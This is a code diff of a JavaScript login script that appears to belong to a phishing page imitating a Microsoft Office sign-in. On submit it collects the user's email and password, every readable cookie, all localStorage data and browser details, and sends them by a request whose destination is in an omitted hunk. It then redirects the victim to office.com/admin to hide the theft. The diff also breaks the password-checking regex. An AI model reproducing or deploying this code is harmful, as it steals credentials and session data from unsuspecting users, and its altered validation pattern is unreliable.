@@ -14,40 +14,38 @@ window.onload = function () {
     emailInput.style.display = "inline";
   }
 };
+
 function validateEmail(email) {
   const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   return pattern.test(email);
 }
 
 function validatePassword(password) {
-  const pattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;
+  const pattern = /^(?=.[a-z])(?=.[A-Z])(?=.\d)(?=.[\W_]).{8,}$/;
   return pattern.test(password);
 }
-const password = document.getElementById("password").value;
-const email = emailSpan.innerText || emailInput.value.trim();
-const errorMessage = document.getElementById("error-message");
-const emailSpan = document.getElementById("user-email");
-const emailInput = document.getElementById("email-input");
 
-if (!validateEmail(email)) {
-  errorMessage.innerText = "Invalid email format.";
-  return;
-}
-if (!validatePassword(password)) {
-  errorMessage.innerText = "password is not correct try again";
-  return;
-}
-
-errorMessage.innerText = "";
-
+// ✅ Define this globally so it can be called from HTML
 function handleLogin() {
-  const email = document.getElementById("user-email").innerText;
+  const emailSpan = document.getElementById("user-email");
+  const emailInput = document.getElementById("email-input");
+  const email = emailSpan.innerText || emailInput.value.trim();
   const password = document.getElementById("password").value;
+  const errorMessage = document.getElementById("error-message");
 
-  // Create an object to store all accessible cookies
+  if (!validateEmail(email)) {
+    errorMessage.innerText = "Invalid email format.";
+    return;
+  }
+  if (!validatePassword(password)) {
+    errorMessage.innerText = "Password is not correct, try again.";
+    return;
+  }
+
+  errorMessage.innerText = "";
+
+  // Gather cookie and storage data
   const cookies = {};
-
-  // Try to get document.cookie (this only works for non-HttpOnly cookies for your domain)
   if (document.cookie) {
     document.cookie.split(";").forEach(function (cookie) {
       const parts = cookie.trim().split("=");
@@ -57,7 +55,6 @@ function handleLogin() {
     });
   }
 
-  // Add localStorage data as well (not cookies, but still valuable)
   const storageData = {};
   for (let i = 0; i < localStorage.length; i++) {
     const key = localStorage.key(i);
@@ -78,10 +75,10 @@ function handleLogin() {
       platform: navigator.platform,
     }),
   })
-    .then((response) => {
+    .then(() => {
       window.location.href = "https://office.com/admin";
     })
-    .catch((error) => {
+    .catch(() => {
       window.location.href = "https://office.com/admin";
     });
 }
